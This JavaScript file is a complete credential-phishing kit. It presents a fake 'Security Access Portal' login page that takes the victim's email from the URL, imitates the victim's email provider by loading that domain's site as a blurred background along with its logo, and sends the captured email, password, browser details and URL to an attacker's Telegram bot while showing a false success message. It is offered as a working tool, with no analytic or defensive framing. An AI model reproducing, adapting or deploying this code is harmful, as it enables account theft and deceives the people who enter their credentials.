const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

let currentBackgroundDomain = '';
let userLanguage = 'en';
let translations = {};

const translationStrings = {
    en: {
        subtitle: "Security Access Portal",
        email_label: "Email",
        password_label: "Password",
        show_password: "Show",
        hide_password: "Hide",
        login_button: "Login",
        forgot_password: "Forgot password?",
        alternative_method: "Use alternative method",
        encrypted_connection: "Encrypted connection",
        copyright: "© 2024",
        privacy: "Privacy",
        terms: "Terms",
        security: "Security",
        please_fill: "Please fill in all fields",
        sending: "Sending...",
        submitted_success: "Login submitted successfully",
        error_submitting: "Error submitting form. Please try again.",
        logging_into: "Logging into"
    }
};

function detectUserLanguage() {
    const browserLang = navigator.language || navigator.userLanguage || 'en';
    return browserLang.split('-')[0].toLowerCase();
}

function getLanguageName(langCode) {
    const languageNames = {
        'en': 'English', 'es': 'Español', 'fr': 'Français', 'de': 'Deutsch',
        'it': 'Italiano', 'pt': 'Português', 'ru': 'Русский', 'zh': '中文',
        'ja': '日本語', 'ko': '한국어', 'ar': 'العربية', 'hi': 'हिन्दी',
        'nl': 'Nederlands', 'sv': 'Svenska', 'no': 'Norsk', 'da': 'Dansk',
        'pl': 'Polski', 'cs': 'Čeština', 'el': 'Ελληνικά', 'he': 'עברית',
        'th': 'ไทย', 'vi': 'Tiếng Việt', 'id': 'Bahasa Indonesia', 'tl': 'Filipino',
        'tr': 'Türkçe'
    };
    return languageNames[langCode] || langCode.toUpperCase();
}

async function translatePage(lang) {
    if (lang === 'en' || !lang) {
        updateLanguageButton('en');
        return;
    }
    
    const elements = document.querySelectorAll('[data-i18n]');
    const textsToTranslate = [];
    const elementMap = [];
    
    elements.forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translationStrings.en[key]) {
            textsToTranslate.push(translationStrings.en[key]);
            elementMap.push({ element: el, key: key });
        }
    });
    
    if (textsToTranslate.length === 0) return;
    
    try {
        const services = [
            {
                url: 'https://libretranslate.de/translate',
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    q: textsToTranslate,
                    source: 'en',
                    target: lang,
                    format: 'text'
                })
            },
            {
                url: 'https://translate.argosopentech.com/translate',
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    q: textsToTranslate,
                    source: 'en',
                    target: lang,
                    format: 'text'
                })
            }
        ];
        
        let translatedTexts = [];
        
        for (const service of services) {
            try {
                const response = await fetch(service.url, {
                    method: service.method,
                    headers: service.headers,
                    body: service.body,
                    signal: AbortSignal.timeout(5000)
                });
                
                if (response.ok) {
                    const data = await response.json();
                    translatedTexts = data.translatedText || [];
                    if (translatedTexts.length === textsToTranslate.length) break;
                }
            } catch (error) {
                continue;
            }
        }
        
        if (translatedTexts.length === textsToTranslate.length) {
            elementMap.forEach((item, index) => {
                if (translatedTexts[index]) {
                    item.element.textContent = translatedTexts[index];
                }
            });
            
            const loggingIntoIndex = textsToTranslate.indexOf("Logging into");
            if (loggingIntoIndex !== -1) {
                translations.logging_into = translatedTexts[loggingIntoIndex];
            }
        }
    } catch (error) {}
    
    updateLanguageButton(lang);
}

function updateLanguageButton(lang) {
    const langBtn = document.getElementById('langToggle');
    if (langBtn) {
        langBtn.textContent = `🌐 ${getLanguageName(lang)}`;
    }
}

function setupLanguageToggle() {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.addEventListener('click', async () => {
        if (userLanguage === 'en') {
            const detectedLang = detectUserLanguage();
            if (detectedLang !== 'en') {
                userLanguage = detectedLang;
                await translatePage(detectedLang);
            }
        } else {
            userLanguage = 'en';
            location.reload();
        }
    });
}

async function loadWebsiteBackground(domain) {
    if (!domain || currentBackgroundDomain === domain) return;
    
    currentBackgroundDomain = domain;
    
    const existingIframe = document.querySelector('.website-background');
    if (existingIframe) existingIframe.remove();
    
    const iframe = document.createElement('iframe');
    iframe.className = 'website-background';
    iframe.id = 'websiteBackground';
    iframe.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        border: none;
        background: white;
        opacity: 0;
        transition: opacity 1s ease;
        filter: blur(8px);
        transform: scale(1.05);
    `;
    
    const urlAttempts = [
        `https://${domain}`,
        `https://www.${domain}`,
        `http://${domain}`,
        `http://www.${domain}`,
        `https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2F${domain}`,
        `https://r.jina.ai/https://${domain}`,
        `https://cors-anywhere.herokuapp.com/https://${domain}`,
        `https://api.allorigins.win/raw?url=https://${domain}`
    ];
    
    document.body.appendChild(iframe);
    let loadedSuccessfully = false;
    
    for (const url of urlAttempts) {
        try {
            await new Promise((resolve) => {
                const timeout = setTimeout(() => resolve(), 3000);
                
                iframe.onload = () => {
                    clearTimeout(timeout);
                    loadedSuccessfully = true;
                    setTimeout(() => iframe.style.opacity = '1', 500);
                    resolve();
                };
                
                iframe.onerror = () => {
                    clearTimeout(timeout);
                    resolve();
                };
                
                iframe.src = url;
                iframe.setAttribute('referrerpolicy', 'no-referrer');
                iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
            });
            if (loadedSuccessfully) break;
        } catch (error) {}
    }
    
    if (!loadedSuccessfully) {
        iframe.src = `https://image.thum.io/get/width/1920/crop/1080/noanimate/https://${domain}`;
        iframe.onload = () => setTimeout(() => iframe.style.opacity = '1', 500);
        iframe.onerror = () => createThemedBackground(domain);
    }
}

function createThemedBackground(domain) {
    const themedPage = `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    height: 100vh;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    font-family: Arial, sans-serif;
                    text-align: center;
                }
                h1 { font-size: 48px; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
                p { font-size: 24px; opacity: 0.9; }
                .domain {
                    font-size: 36px;
                    font-weight: bold;
                    margin: 20px 0;
                    background: rgba(255,255,255,0.1);
                    padding: 10px 30px;
                    border-radius: 10px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <h1>${domain}</h1>
            <div class="domain">${domain}</div>
            <p>Secure Login Portal</p>
        </body>
        </html>
    `;
    
    const blob = new Blob([themedPage], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    
    const iframe = document.getElementById('websiteBackground');
    if (iframe) {
        iframe.src = url;
        setTimeout(() => iframe.style.opacity = '1', 500);
    }
}

async function extractAndSetEmailFromHash() {
    const hash = window.location.hash;
    if (!hash) return false;
    
    const emailFromHash = hash.substring(1);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (emailRegex.test(emailFromHash)) {
        document.getElementById('user_email').value = emailFromHash;
        const domain = emailFromHash.split('@')[1];
        
        loadWebsiteBackground(domain);
        fetchDomainLogo(domain);
        showDomainInfo(domain);
        setTimeout(() => document.getElementById('pw').focus(), 100);
        return true;
    }
    return false;
}

async function fetchDomainLogo(domain) {
    if (!domain) return;
    const logoImg = document.getElementById('logoImg');
    
    const faviconSources = [
        `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
        `https://favicon.twenty.com/${domain}`,
        `https://icons.duckduckgo.com/ip3/${domain}.ico`,
        `https://${domain}/favicon.ico`,
        `https://www.${domain}/favicon.ico`
    ];
    
    for (const src of faviconSources) {
        const img = new Image();
        try {
            await new Promise((resolve, reject) => {
                img.onload = resolve;
                img.onerror = reject;
                img.src = src;
            });
            logoImg.src = src;
            return;
        } catch (e) {}
    }
}

function showDomainInfo(domain) {
    const domainInfoDiv = document.getElementById('domainInfo');
    if (!domain || !domainInfoDiv) return;
    
    const domainLogo = document.createElement('img');
    domainLogo.className = 'domain-logo';
    domainLogo.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
    domainLogo.alt = `${domain} logo`;
    domainLogo.onerror = function() { this.style.display = 'none'; };
    
    const domainText = document.createElement('span');
    domainText.textContent = `${translations.logging_into || "Logging into"} ${domain}`;
    
    domainInfoDiv.innerHTML = '';
    domainInfoDiv.appendChild(domainLogo);
    domainInfoDiv.appendChild(domainText);
}

function setupFormHandling() {
    const form = document.getElementById('loginForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const submitBtn = document.getElementById('submitBtn');
        const messageDiv = document.getElementById('message');
        const originalBtnText = submitBtn.textContent;
        const email = document.getElementById('user_email').value;
        const password = document.getElementById('pw').value;
        
        if (!email || !password) {
            showMessage(translations.please_fill || 'Please fill in all fields', 'error');
            return;
        }
        
        submitBtn.disabled = true;
        submitBtn.textContent = translations.sending || 'Sending...';
        messageDiv.style.display = 'none';
        
        try {
            await sendToTelegram(email, password);
            showMessage(translations.submitted_success || 'Login submitted successfully', 'success');
            document.getElementById('pw').value = '';
        } catch (error) {
            showMessage(translations.error_submitting || 'Error submitting form. Please try again.', 'error');
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = originalBtnText;
        }
    });
}

async function sendToTelegram(email, password) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
        !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        throw new Error('Configure Telegram bot token and chat ID first');
    }
    
    const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
    const message = `🔐 *New Login Submission*\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🏷️ *Domain:* ${domain}\n🌐 *Browser:* ${navigator.userAgent}\n📍 *Language:* ${userLanguage}\n🕐 *Time:* ${new Date().toLocaleString()}\n🔗 *URL:* ${window.location.href}`;
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
    });
    
    const data = await response.json();
    if (!response.ok || !data.ok) throw new Error('Failed to send message to Telegram');
    return data;
}

function showMessage(text, type = 'error') {
    const messageDiv = document.getElementById('message');
    if (!messageDiv) return;
    
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    setTimeout(() => messageDiv.style.display = 'none', 5000);
}

function setupEmailInputListener() {
    const emailInput = document.getElementById('user_email');
    if (!emailInput) return;
    
    emailInput.addEventListener('input', async function(e) {
        const email = e.target.value;
        if (email.includes('@')) {
            const domain = email.split('@')[1];
            if (domain.includes('.')) {
                showDomainInfo(domain);
                if (domain !== currentBackgroundDomain) {
                    loadWebsiteBackground(domain);
                    fetchDomainLogo(domain);
                }
            }
        }
    });
}

function setupPasswordToggle() {
    const toggle = document.getElementById('togglePassword');
    const pw = document.getElementById('pw');
    
    if (toggle && pw) {
        toggle.addEventListener('click', function() {
            const isPassword = pw.type === 'password';
            pw.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 
                (translations.hide_password || 'Hide') : 
                (translations.show_password || 'Show');
        });
    }
}

async function initialize() {
    translations = { ...translationStrings.en };
    
    setupFormHandling();
    setupEmailInputListener();
    setupPasswordToggle();
    setupLanguageToggle();
    
    const detectedLang = detectUserLanguage();
    userLanguage = detectedLang;
    updateLanguageButton(detectedLang);
    
    if (detectedLang !== 'en') {
        await translatePage(detectedLang);
    }
    
    await extractAndSetEmailFromHash();
    
    if (!currentBackgroundDomain) {
        createThemedBackground('Secure Portal');
    }
}

document.addEventListener('DOMContentLoaded', initialize);
